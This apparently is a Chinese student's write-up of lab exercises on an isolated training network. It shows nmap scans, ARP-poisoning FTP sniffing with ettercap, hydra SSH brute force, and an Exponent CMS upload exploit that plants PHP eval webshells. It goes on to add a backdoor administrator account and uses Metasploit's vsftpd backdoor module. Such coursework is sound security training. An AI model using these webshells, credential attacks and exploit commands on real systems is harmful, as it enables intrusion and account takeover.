<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316183326844.png" alt="image-20200316183326844"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">探测开放端口及服务</span></span><br><span class="line">快速端口扫描</span><br><span class="line">nmap -F -v 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316183738031.png" alt="image-20200316183738031"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">版本扫描</span></span><br><span class="line">nmap -sV -v taget_ip</span><br><span class="line">nmap -sV -v 192.168.1.3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316184802094.png" alt="image-20200316184802094"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 192.168.1.4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316185228476.png" alt="image-20200316185228476"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">操作系统扫描</span></span><br><span class="line">nmap -O -v target_ip</span><br><span class="line">nmap -O -v 192.168.1.3</span><br><span class="line">nmap -O -v 192.168.1.4</span><br></pre></td></tr></table></figure>

<p>nmap -O -v 192.168.1.3</p>
<p>没有扫描到该主机是Centos7（no exact OS matches for host）</p>
<p>并且向我们请求，如果我们知道目标主机的版本号的话，请把目标的特征哈希值上传HHH</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316185543332.png" alt="image-20200316185543332"></p>
<p>nmap -O -v 192.168.1.4</p>
<p>可以看到猜测192.168.1.4操作系统版本好最高的为windows 2012的，正确</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200506175003615.png" alt="image-20200506175003615"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316185822712.png" alt="image-20200316185822712"></p>
<p>2.</p>
<p>使用嗅探工具对目标机的vsftpd服务进行嗅探。通过设置监听网卡、主机、开启arp欺骗、启动嗅探等步骤来嗅探网络内的数据包，获取ftp用户名和密码。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的ettercap工具来完成【操作步骤】1.2，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p><strong>ettercap命令使用常用参数：</strong></p>
<ul>
<li>-l 显示可用网卡</li>
<li>-i 选择网卡</li>
<li>-t 协议选择，tcp/udp/all</li>
<li>-p 不进行毒化攻击，只用来嗅探</li>
<li>-F 载入过滤器文件</li>
<li>-V text 将数据包以文本形式显示在屏幕上</li>
<li><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</li>
</ul>
<p><strong>中间人攻击：</strong></p>
<ul>
<li>arp毒化的中间人攻击，arp毒化的原理简单的说就是伪造MAC地址与IP的对应关系，导致数据包由中间人转手出去。这是<strong>本实验使用的方法</strong>。</li>
<li>icmp欺骗</li>
<li>DHCP spoofing</li>
<li>Port Stealing</li>
</ul>
<p>下面的命令在eth1网卡上用自己的filter嗅探ip为192.168.1.3主机在21端口上的所有通信，并把所有的数据包保存成文件名为“sniffeddata”的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</span><br></pre></td></tr></table></figure>

<p>输入之后如下，开始跑了：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200522230352149.png" alt="image-20200522230352149"></p>
<p>嗅探到了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip:192.168.1.3:21-&gt;uesr:hacker  PASS :123456</span><br><span class="line">ip:192.168.1.3:21-&gt;USER: ftp PASS :ftp123</span><br><span class="line">ip:192.168.1.3:21-&gt;USER: hacker  PASS:123456</span><br><span class="line">ip:192.168.1.3:21-&gt;USER: hacker  PASS:123456</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523101447397.png" alt="image-20200523101447397"></p>
<h3 id="【实验结果】"><a href="#【实验结果】" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将嗅探到的ftp登陆密码作为【实验结果】提交，提交成功后该实验任务完成。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523101752836.png" alt="image-20200523101752836"></p>
<h2 id="任务2-使用crunch、hydra暴力破解ssh服务"><a href="#任务2-使用crunch、hydra暴力破解ssh服务" class="headerlink" title="任务2-使用crunch、hydra暴力破解ssh服务"></a>任务2-使用crunch、hydra暴力破解ssh服务</h2><h3 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h3><p>本实验任务在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<ul>
<li><p>利用kali集成的crunch工具，生成密码字典文件。</p>
</li>
<li><p>使用hydra工具暴力破解ssh服务的登陆密码，以便完全控制目标主机系统</p>
</li>
</ul>
<p>通过完成本实验任务，要求学生掌握服务密码破解原理、技术和工具的使用方法，具备娴熟的系统服务密码破解、漏洞挖掘和利用、信息安全管理和防范的职业能力。</p>
<h3 id="【实验目标】-1"><a href="#【实验目标】-1" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ol>
<li><p>了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</p>
</li>
<li><p>了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。</p>
</li>
<li><p>通过crunch和hydra等工具的学习和使用，掌握字典文件的生成、破解密码等常用的漏洞挖掘和利用技术，具备熟练的漏洞挖掘和防攻击能力。</p>
</li>
</ol>
<h3 id="【实验环境】"><a href="#【实验环境】" class="headerlink" title="【实验环境】"></a>【实验环境】</h3><p><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:crunch" target="_blank" rel="noopener">crunch</a>（继承于kali linux）</p>
<p><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:hydra" target="_blank" rel="noopener">hydra</a>（继承于kali linux）</p>
<h3 id="【实验步骤】-1"><a href="#【实验步骤】-1" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h3><p>2.1在操作机使用相关工具生成密码字典文件password.txt，要求从字符串“hacker +123456”中，随机选9个字符进行排列组合。</p>
<p>⭐提示：可以使用Kali linux集成的crunch工具来完成【操作步骤】2.1，也可以通过操作机自行上传其他工具来完成。</p>
<p>crunch命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">-p#</span><span class="bash">定义密码元素 字符串 或者-p 单词1 单词2 ...以排列组合的方式来生成字典。</span></span><br></pre></td></tr></table></figure>

<p>9 9表示生成最短长度为9位，最长长度为9位，-o 的意思是保存为XXX文件，-p是指以排列组合的方式来生成字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 9 9 password.txt -p hacker+123456</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523121823112.png" alt="image-20200523121823112"></p>
<blockquote>
<p> ⭐吐槽：实验设计不合理，密码排列组合过多，磁盘空间不够（10G+），虚拟机存活时间不能满足（1天）</p>
<p> 按理说排列组合的公式如下</p>
<p> <img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523122101396.png" alt="image-20200523122101396">而crunch算hacker+123456（13个字符选9个）的密码排列组合预计6227020800=13!个明显是算错了，不过无所谓通过查看磁盘分区命令，可以看到磁盘大够满足字典的大小</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -hl</span><br></pre></td></tr></table></figure>
<p> <img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523113534965.png" alt="image-20200523113534965"></p>
<p> 可以看到，本虚拟机最多空闲空间10多G，无法满足我们的需求<br> 所以我继而使用hacker+123（10个字符选9个）的排列组合</p>
<p> <img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523113205792.png" alt="image-20200523113205792"></p>
<p> 需要遍历10！=3628000个密码，然而在后面用hydra工具破解时，平均2秒过一个密码我们来计算一下时间3628000*2/60/60=2015 hours （然鹅虚拟机晚上就关闭了，没有足够的时间来完成遍历）</p>
<p> 即使选择hacker123（9个字符选9个）的排列组合,需要9！=362,880‬，一顿计算下来需要时间201小时，仍然不能遍历完成！！</p>
<p> 不过我们死马当活马医，没准hacker+123456的组合6227020800个密码，一开始就遍历到了呢？</p>
</blockquote>
<p>生成完成，查看生成的密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat password.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523112951808.png" alt="image-20200523112951808"></p>
<p>2.2在操作机使用相关工具爆破目标机（192.168.1.3）远程用户hacker的密码。</p>
<p>⭐提示：可以使用Kali linux集成的hydra工具来完成【操作步骤】2.2，也可以通过操作机自行上传其他工具来完成。</p>
<p>这里的破解用户指的是，破解ssh用户</p>
<p>由于其要求用户名必须在txt文件中，所以我们先将hacker存到hacker.txt中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">touch hacker.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="built_in">echo</span> <span class="string">"hacker"</span>&gt;hacker.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cat hacker.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">hacker</span></span><br></pre></td></tr></table></figure>

<p>然后我们输出ssh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt -t 1 -vV -e ns ip ssh 默认</span><br><span class="line">hydra -L hacker.txt -P password.txt -t 1 -vV -e ns 192.168.1.3 ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523114827811.png" alt="image-20200523114827811"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523115214026.png" alt="image-20200523115214026"></p>
<p>最终我们跑得目标密码结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ssh] host:192.168.1.3 login:hacker  password:hacker123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523123534717.png" alt="image-20200523123534717"></p>
<h3 id="【实验结果】-1"><a href="#【实验结果】-1" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将hydra破解的密码作为【实验结果】提交，提交成功后该实验任务完成</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523123723175.png" alt="image-20200523123723175"></p>
<h2 id="任务3-使用ssh登录目标机并获取key值，获得敏感信息"><a href="#任务3-使用ssh登录目标机并获取key值，获得敏感信息" class="headerlink" title="任务3-使用ssh登录目标机并获取key值，获得敏感信息"></a>任务3-使用ssh登录目标机并获取key值，获得敏感信息</h2><h3 id="【任务描述】"><a href="#【任务描述】" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><ul>
<li><p>本实验任务在任务二操作完成的基础上，远程连接目标机，获得敏感信息。</p>
</li>
<li><p>通过完成本实验任务，要求学生掌握使用ssh远程连接目标机的方法，并在进入系统后，掌握查看文件信息的命令。</p>
</li>
</ul>
<h3 id="【实验目标】-2"><a href="#【实验目标】-2" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><p>掌握使用ssh远程连接目标机的方法</p>
<p>使用相关命令，查看文件内容，获得敏感信息</p>
<h3 id="【实验工具】-1"><a href="#【实验工具】-1" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ssh" target="_blank" rel="noopener">ssh</a></p>
<p>linux命令：ls、more</p>
<h3 id="【操作步骤】"><a href="#【操作步骤】" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>ssh登陆</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.10</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523153142138.png" alt="image-20200523153142138"></p>
<p>linux命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">more 1.key</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ettercap</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523153247375.png" alt="image-20200523153247375"></p>
<h3 id="【实验结果】-2"><a href="#【实验结果】-2" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将1.key文件中的内容作为【实验结果】提交，提交成功后该实验任务完成</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523153717886.png" alt="image-20200523153717886"></p>
<h2 id="任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><h3 id="【任务描述】-1"><a href="#【任务描述】-1" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<ul>
<li>编写脚本，获得目标机网站webshell权限。</li>
<li>向目标机添加新用户，以便完全控制目标主机系统，获得敏感信息。</li>
</ul>
<p>通过完成本实验任务，要求学生在掌握webshell上传及权限获取方法的基础上，掌握向目标机添加新用户，设置用户权限并实现目标机控制的方法，进而掌握企业级复杂网络webshell相关的高级漏洞挖掘和利用方法，具备信息系统安全管理职业能力。</p>
<h3 id="【实验目标】-3"><a href="#【实验目标】-3" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>理解webshell权限获取的意义和方法。</li>
<li>掌握获取webshell权限基础上控制目标机的方法。</li>
<li>掌握企业级复杂网络漏洞挖掘和利用方法。</li>
<li>具备信息系统安全管理职业能力。</li>
</ul>
<h3 id="【实验工具】-2"><a href="#【实验工具】-2" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p><a href="http://210.42.123.2:8088/doku.php?id=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7:firefox" target="_blank" rel="noopener">firefox</a></p>
<p>python</p>
<h3 id="【操作步骤】-1"><a href="#【操作步骤】-1" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>🚀本实验主要基于一个开源内容管理系统Exponent-cms任意文件上传漏洞分析 (cve-2016-7095)的基础上的。(安全客分析)[<a href="https://www.anquanke.com/post/id/84514]" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84514]</a></p>
<ul>
<li>没有对后缀名进行一个检测，可以上传任意文件。文件命名的方式是time()+下划线+文件名。</li>
<li>紧跟着就有一个文件删除的操作。</li>
<li>但在删除之前，调用了一个正则匹配是验证你是否是有效的邮箱地址，如果不是有效的邮箱地址，就会throw出错误信息，也导致了程序的文件删除操作无法执行。</li>
</ul>
<p>⭐ <code>startx</code>进入kali图形化界面</p>
<p><strong>4.1</strong>在操作机创建脚本，建立一个上传表单；建立一个php文件，作为一句话木马。通过上传表单上传一句话。</p>
<blockquote>
<p>提示：对于该步骤，上传表单可使用html，也可以通过操作机自行上传自己已有的脚本来完成。</p>
</blockquote>
<p>在很多的渗透过程中，渗透人员会上传一句话木马（简称Webshell）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。【基本原理】@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最简单的一句话木马：</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'attack'</span>]) <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#本实验的木马，添加phpinfo显示PHP的当前信息</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="keyword">eval</span>($_REQUEST[cmd]); 	phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523173026295.png" alt="image-20200523173026295"></p>
<p>如下建立上传表单：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523170530261.png" alt="image-20200523170530261"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#url</span></span><br><span class="line">url_for_upload=<span class="string">'http://192.168.1.4/index.php?module=eventregistration&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1'</span></span><br><span class="line"><span class="comment">#打开文件</span></span><br><span class="line">files=&#123;<span class="string">'attach'</span>:open(<span class="string">'index.php'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">requests.post(url_for_upload,files=files)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'upload finish'</span></span><br></pre></td></tr></table></figure>

<p><strong>4.2</strong>在浏览器另外一个页面快速打开<code>http://192.168.1.4/index.php?module=eventregistration&amp;amp;action=eventsCalendar</code>，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。</p>
<p><strong>4.3</strong>编写脚本并运行，获得上传的文件的URL路径。</p>
<p>（提示：对于该步骤，可使用python来编写脚本，也可以使用其他语言来编写脚本，或者通过操作机自行上传自己已有的脚本来完成）</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523165356054.png" alt="image-20200523165356054"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523170304481.png" alt="image-20200523170304481"></p>
<p>上传YijuHua.php</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523172751055.png" alt="image-20200523172751055"></p>
<p>运行代码，找到了</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523172604037.png" alt="image-20200523172604037"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523173238445.png" alt="image-20200523173238445"></p>
<p><strong>4.4</strong>在浏览器地址栏中输入“<code>http://192.168.1.4/ tmp/1516041535_exp.php?cmd=system(&#39;cmd命令&#39; );</code>”，通过设置不同的system()函数命令参数（这里以cmd命令指代），并执行相应命令，如查看端口、用户等。</p>
<p>查看端口：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523173737856.png" alt="image-20200523173737856"></p>
<p><strong>4.5</strong>向目标机网站（http：//192.168.1.4）添加新用户，用户名：hacker，密码：Beijing123。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user hacker Beijing123 /add</span><br></pre></td></tr></table></figure>

<p><strong>4.6</strong>把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators hacker /add</span><br></pre></td></tr></table></figure>

<p><strong>4.7</strong>以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。</p>
<p>（提示：可使用工具rdesktop远程连接目标机，远程连接端口可通过在浏览器中使用system()函数执行相关命令来获得）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.1.4:35155</span><br></pre></td></tr></table></figure>

<p>4.8设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。</p>
<p>设置权限——完全控制</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204924371.png" alt="image-20200529204924371"></p>
<h3 id="【实验结果】-3"><a href="#【实验结果】-3" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将探测到的目标机上key2.txt文件的内容作为【实验结果】提交，提交成功后该实验任务完成。</p>
<p>结果如下：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523175321680.png" alt="image-20200523175321680"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523175425720.png" alt="image-20200523175425720"></p>
<h1 id="1-2-漏洞挖掘实验"><a href="#1-2-漏洞挖掘实验" class="headerlink" title="1.2 漏洞挖掘实验"></a>1.2 漏洞挖掘实验</h1><h2 id="任务一-使用nmap、MSF和Metasploit进行漏洞挖掘和利用"><a href="#任务一-使用nmap、MSF和Metasploit进行漏洞挖掘和利用" class="headerlink" title="任务一 使用nmap、MSF和Metasploit进行漏洞挖掘和利用"></a>任务一 使用nmap、MSF和Metasploit进行漏洞挖掘和利用</h2><h3 id="【任务描述】-2"><a href="#【任务描述】-2" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用kali集成的扫描工具nmap，对网络进行探测，收集目标网络存活主机信息，并利用主机开放的服务器，获取目标主机的root权限。
利用kali集成的MSF和Metasploit两个工具，实现对目标主机的漏洞探测和利用，并成功攻击目标机。</code></pre><p>通过完成本实验任务，要求学生掌握利用nmap进行网络探测并获取目标主机root权限等关键信息的方法；掌握通过MSF和Metasploit实现对目标主机的漏洞探测和漏洞模块利用的流程、方法和技巧，为完成后续漏洞挖掘实验任务奠定坚实的网络探测技术基础。</p>
<h3 id="【实验目标】-4"><a href="#【实验目标】-4" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
了解扫描工具nmap的基本使用方法，掌握常用的网络扫描和探测命令。
掌握利用nmap进行网络探测并获取目标主机root权限等关键信息的方法。
了解MSF和Metasploit工具的基本功能，掌握常用的漏洞探测和利用命令。
掌握通过MSF和Metasploit实现对目标主机的漏洞探测和漏洞模块利用技术和方法。</code></pre><p>通过nmap、MSF和Metasploit等工具的学习和使用，能够融会贯通，掌握自主学习和实践主流企业级网络扫描工具功能、操作技巧、检测结果分析、漏洞挖掘的常用方法，最终具备企业复杂网络漏洞挖掘的职业能力。</p>
<h3 id="【实验工具】-3"><a href="#【实验工具】-3" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nmap" target="_blank" rel="noopener">nmap</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:msf" target="_blank" rel="noopener">msf</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:metasploit" target="_blank" rel="noopener">metasploit</a>（集成于kali linux）</li>
</ul>
<h3 id="【操作步骤】-2"><a href="#【操作步骤】-2" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.1在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、操作系统及版本信息。</p>
<blockquote>
<p> 提示：可以使用Kali linux集成的nmap工具来完成【操作步骤】1.1，也可以通过操作机自行上传其他工具来完成。</p>
<p>注意：nmap命令功能较强，参数众多，不同命令执行需要的时间长短不一(长则数分钟)。若遇到长时间没有结果返回，建议ctrl-c停止执行，并更换命令参数，或者增加-v获取更详细的扫描进展</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24 #扫描网段内存活主机</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529105450765.png" alt="image-20200529105450765"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -F 192.168.1.3</span><br><span class="line">nmap -F 192.168.1.4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529105728752.png" alt="image-20200529105728752"></p>
<p>1.2使用网络扫描工具搜索vsftpd FTP服务器程序的相关工具和攻击载荷，搜索出vsftpd FTP服务器的漏洞利用模块信息，并启用漏洞利用模块，设置目标主机的IP地址,然后扫描探测可以在目标主机执行的shellcode代码，并在远程目标主机执行该shellcode代码。最后对目标主机实施溢出攻击。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的MSF工具来完成【操作步骤】1.2，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search vsftpd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529110348767.png" alt="image-20200529110348767"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">set rhost 192.168.1.3</span><br><span class="line">set payload cmd/unix/interact</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529110758676.png" alt="image-20200529110758676"></p>
<p>1.3在目标主机上查找扩展名为key的文件，并查看1.key文件内容。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的MSF工具来完成【操作步骤】1.3，也可以通过操作机自行上传其他工具或使用其他命令来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br><span class="line"><span class="meta">#</span><span class="bash">查找/目录中文件名为1.key的文件</span></span><br><span class="line">find / -name 1.key</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /usr/src/1.key</span></span><br><span class="line">cat /usr/src/1.key</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> metasploit</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529112613572.png" alt="image-20200529112613572"></p>
<h3 id="【实验结果】-4"><a href="#【实验结果】-4" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将1.key文件中的内容作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529112828342.png" alt="image-20200529112828342"></p>
<h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><h3 id="【任务描述】-3"><a href="#【任务描述】-3" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用kali集成的扫描工具nikto和crunch，对目标网站进行探测，根据收集的信息进行渗透(提交网站后台管理员登陆密码)，获取网站的webshell。
使用burpsuit工具软件暴力破解目标网站管理员登陆密码，以完全控制目标主机系统。</code></pre><p>通过完成本实验任务，要求学生掌握对网站进行探测和渗透的技术和工具使用方法，具体包括：利用nikto进行网页服务器探测扫描的方法；掌握使用crunch生成密码字典文件的方法；掌握burpsuit工具软件暴力破解登陆密码的方法，具备更为夯实的漏洞挖掘和利用、信息系统安全防范的职业能力。</p>
<h3 id="【实验目标】-5"><a href="#【实验目标】-5" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>了解网络漏洞渗透、webshell的概念，认知常用的安全漏洞扫描工具。</li>
<li>了解nikto工具的基本功能，熟悉其常用的网页服务器扫描和探测命令。</li>
<li>了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</li>
<li>了解burpsuit工具的基本功能，掌握其暴力破解密码的基本方法。</li>
</ul>
<p>通过nikto、crunch和burpsuit等工具的学习和使用，掌握对网站进行渗透、获取webshell、破解密码等常用的漏洞挖掘和利用技术，领会预防漏洞攻击的方法，具备丰富的漏洞挖掘和防攻击能力。</p>
<h3 id="【实验工具】-4"><a href="#【实验工具】-4" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nikto" target="_blank" rel="noopener">nikto</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:crunch" target="_blank" rel="noopener">crunch</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:burpsuit" target="_blank" rel="noopener">burpsuit</a></li>
</ul>
<h3 id="【操作步骤】-3"><a href="#【操作步骤】-3" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>2.1在操作机终端中扫描目标机网站（<code>http://192.168.1.4</code>）目录结构，查看目标网站的/admin/login.php后台管理界面。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的Nikto工具来完成【操作步骤】2.1，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p>⭐ <code>startx</code>进入kali图形化界面</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529114055478.png" alt="image-20200529114055478"></p>
